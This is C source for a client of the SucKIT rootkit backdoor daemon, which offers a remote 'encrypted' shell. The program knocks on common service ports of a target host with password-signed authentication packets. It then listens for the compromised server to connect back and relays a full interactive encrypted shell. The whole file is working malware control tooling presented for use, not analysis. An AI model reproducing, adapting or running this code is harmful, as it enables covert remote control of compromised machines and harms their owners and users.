/*
 * $Id: zlogin.c, client for suckitd, remote "encrypted" shell service
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>

#include <signal.h>

#include <termios.h>
#include <time.h>

#include <fcntl.h>
#include <errno.h>

#include "sk.h"
#include "crypto.h"

static	int
services[] = {53, 79, 110, 220, 21, 22, 25, 80, 113, 111, 0};

#define printe(args...) fprintf(stderr, args)

int	to = 0;
struct  termios oldterm, newterm;
struct	hash h;
int	winchange = 0;
int	sn = 0;


void	sendnull(int n)
{
	sn = 1;
	signal(SIGALRM, sendnull);
	alarm(BDTIMEOUT/2);
}

void	timeout(int n)
{
	to = 1;
	alarm(0);
}

void	set_timeout(int n)
{
	to = 0;
	alarm(n);
	signal(SIGALRM, timeout);
}

int	usage(char *s)
{
	printe("use:\n"
		"%s [hsditc] ...args\n"
		"-h\tSpecifies ip/hostname of host where is running\n"
		"\tSK daemon\n"
		"-s\tSpecifies port where we should listen for incoming\n"
		"\tserver' connection (if some firewalled etc), if not\n"
		"\tspecified, we'll get some from os\n"
		"-d\tSpecifies port of service we could use for authentication\n"
		"\techo, telnet, ssh, httpd... is probably good choice\n"
		"-i\tInterval between request sends (in seconds)\n"
		"-t\tTime we will wait for server before giving up (in seconds)\n"
		"-c\tConnect timeout (in seconds)\n",
		s);
	return 1;
}

ulong	resolve(char *s, char *p)
{
        struct  hostent *he;
        struct  sockaddr_in si;

        bzero((char *) &si, sizeof(si));
        si.sin_addr.s_addr = inet_addr(s);
	*p = 0;
        if (si.sin_addr.s_addr == INADDR_NONE) {
                he = gethostbyname(s);
                if (!he) {
                        return INADDR_NONE;
                }
                memcpy((char *) &si.sin_addr, (char *) he->h_addr,
                       sizeof(si.sin_addr));
        }
	strcpy(p, inet_ntoa(si.sin_addr));
        return si.sin_addr.s_addr;

}

void	get_pass(struct auth *a, ushort port)
{
        struct  termios old, new;
	char	p[256];
	
        tcgetattr(0, &old);
        new = old;
        new.c_lflag &= ~(ICANON | ECHO | ISIG);
        new.c_iflag &= ~(IXON | IXOFF);
        tcsetattr(0, TCSAFLUSH, &new);
	printe("password: "); fflush(stderr);
	fgets(p, 255, stdin);
        tcsetattr(0, TCSAFLUSH, &old);

	hash160(p, strlen(p), &h);
	sign(htons(port), a, &h);
	printe("\n");
}

void	child_died(int n)
{
	exit(1);
}

void	child_wait(int n)
{
	wait(NULL);
}

void	handler(int n)
{
        tcsetattr(0, TCSAFLUSH, &oldterm);
	printe("Got signal %d, exiting...\n", n);
	exit(0);
}

void    winch(int i)
{
        signal(SIGWINCH, winch);
        winchange++;
}

#define	BUF	16384

/* listening parent */
int	listener(int child, int sock, struct sockaddr_in *srv)
{
	struct	sockaddr_in cli;
	crypt_ctx	crypt, decrypt;
	int	con;
	int	slen = sizeof(cli);
	uchar	buf[16384];
	char	*p;

	signal(SIGCHLD, child_died);
	con = accept(sock, (struct sockaddr *) &cli, &slen);
	close(sock);
	if (con < 0) {
		perror("accept");
		return 1;
	}

	signal(SIGCHLD, child_wait);
	kill(child, SIGTERM);
	
	printe("Server connected. Escape character is '^K'\n");

        tcgetattr(0, &oldterm);

	signal(SIGHUP, handler);
	signal(SIGINT, handler);
	signal(SIGQUIT, handler);
	signal(SIGILL, handler);
	signal(SIGABRT, handler);
	signal(SIGBUS, handler);
	signal(SIGFPE, handler);
	signal(SIGSEGV, handler);
	signal(SIGTERM, handler);
	signal(SIGPIPE, handler);
	signal(SIGIO, handler);
	winch(0);

        newterm = oldterm;
        newterm.c_lflag &= ~(ICANON | ECHO | ISIG);
        newterm.c_iflag &= ~(IXON | IXOFF);
        tcsetattr(0, TCSAFLUSH, &newterm);

	/* setup crypto */
	crypt_init(&h, &crypt);
	crypt_init(&h, &decrypt);

	/* setup enviroment */
	buf[0] = 0;
	p = getenv("TERM");
	if (p) sprintf(buf, "TERM=%s", p);
	encrypt_data(&crypt, buf, ENVLEN);
	write(con, buf, ENVLEN);

	sendnull(0);
	sn = 0;

	while (1) {
	        struct  winsize ws;
		fd_set	fds;

		FD_ZERO(&fds);
		FD_SET(0, &fds);
		FD_SET(con, &fds);


                if (winchange) {
                        if (ioctl(1, TIOCGWINSZ, &ws) == 0) {
				uchar buf[5];
                                buf[0] = ECHAR;
                                buf[1] = (ws.ws_col >> 8) & 0xFF;
                                buf[2] = ws.ws_col & 0xFF;
                                buf[3] = (ws.ws_row >> 8) & 0xFF;
                                buf[4] = ws.ws_row & 0xFF;
				encrypt_data(&crypt, buf, 5);
				write(con, buf, 5);
                        }
                        winchange = 0;
                }

		errno = 0;

		if (sn) {
			uchar	buf[5] = {ECHAR, 0, 0, 0, 0};
			sn = 0;
			encrypt_data(&crypt, buf, 5);
			write(con, buf, 5);
		}

		if (select(con + 1, &fds, NULL, NULL, NULL) < 0) {
			if (errno == EINTR)
				continue;
			break;
		}

		/* stdin => shell */
		if (FD_ISSET(0, &fds)) {
			int	count;
			errno = 0;
			count = read(0, buf, BUF);
			if ((count <= 0) && (errno != EINTR))
				break;
			if (memchr(buf, ECHAR, count))
				break;
			encrypt_data(&crypt, buf, count);
			if ((write(con, buf, count) < 0) && (errno != EINTR))
				break;
		}

		/* shell => stdout */
		if (FD_ISSET(con, &fds)) {
			int	count;
			errno = 0;
			count = read(con, buf, BUF);
			if ((count <= 0) && (errno != EINTR))
				break;
			decrypt_data(&decrypt, buf, count);
			write(1, buf, count);
		}
	}
        tcsetattr(0, TCSAFLUSH, &oldterm);
	printe("Connection disappeared, errno=%d\n", errno);
	close(con);
	return 0;
}

int	main(int argc, char *argv[])
{
	uchar	*h = NULL;
	int	s = 0; int d = 0;
	int	i = 2; int t = 5;
	int	c = 10;
	int	x, y, z;
	int	pid;
	int	sock;
	ulong	ip;
	char	ipname[256];
	struct	auth a = {{}, 0};
	struct	sockaddr_in srv;

	srand(time(NULL));
	printe("%s\n", BANNER);

	while ( (z = getopt(argc, argv, "h:H:s:S:d:D:i:I:t:T:C:c:") ) != EOF) {
		if (!optarg)
			return usage(argv[0]);
		switch (z & 0xdf) {
			case 'H':
				h = optarg;
				break;
			case 'S':
				if (sscanf(optarg, "%u\n", &s) != 1)
					return usage(argv[0]);
				break;
			case 'D':
				if (sscanf(optarg, "%u\n", &d) != 1)
					return usage(argv[0]);
				break;
			case 'I':
				if (sscanf(optarg, "%u\n", &i) != 1)
					return usage(argv[0]);
				break;
			case 'T':
				if (sscanf(optarg, "%u\n", &t) != 1)
					return usage(argv[0]);
				break;
			case 'C':
				if (sscanf(optarg, "%u\n", &c) != 1)
					return usage(argv[0]);
				break;
				
			default:
				usage(argv[0]);
		}
	}

	if ((!h) || (s > 65535) || (d > 65535))
		return usage(argv[0]);

	if (d) {
		services[0] = d;
		services[1] = 0;
	}

	ip = resolve(h, ipname);
	if (ip == INADDR_NONE) {
		perror(h);
		return 1;
	}

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock < 0) {
		perror("socket");
		return 1;
	}

	bzero((char *) &srv, sizeof(srv));

	srv.sin_family = AF_INET;
	srv.sin_addr.s_addr = htonl(INADDR_ANY);
	srv.sin_port = htons(s);

	if (bind(sock, (struct sockaddr *) &srv, sizeof(srv)) < 0) {
		perror("bind");
		return 1;
	}

	if (listen(sock, 1) < 0) {
		perror("listen");
		return 1;
	}

	x = sizeof(s);
	if (getsockname(sock, (struct sockaddr *) &srv, &x) < 0) {
		perror("getsockname");
		return 1;
	}

	s = ntohs(srv.sin_port);
	printf("Listening to port %d\n", s);

	get_pass(&a, s);

	pid = fork();
	if (pid < 0) {
		perror("fork");
		return 1;
	}

	if (pid != 0)
		return listener(pid, sock, &srv);

	close(sock);

	/* -------- this is child --------- */
	for (z = 0; services[z]; z++) {
		struct	sockaddr_in cli;
		int	sock;

		sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock < 0) {
			perror("socket");
			return 1;
		}


		bzero(&cli, sizeof(cli));
		cli.sin_family = AF_INET;
		cli.sin_port = htons(services[z]);
		cli.sin_addr.s_addr = ip;

		printe("Trying %s:%d...\n", ipname, services[z]);

		set_timeout(c);

		y = connect(sock, (struct sockaddr *) &cli, sizeof(cli));
		if (to) {
			printe("connect: Timed out\n");
			continue;
		}

		if (y < 0) {
			perror("connect");
			continue;
		}

		printe("Trying...");

		set_timeout(t);

		while (!to) {
			if (write(sock, &a, sizeof(a)) < 0)
				break;
			sleep(i);
			printe("."); fflush(stderr);
		}
		printe("\n%s: no response within %d seconds\n", h, t);
		close(sock);
	}

	printe("%s: server not responding, giving up!\n", h);
	return 1;
}
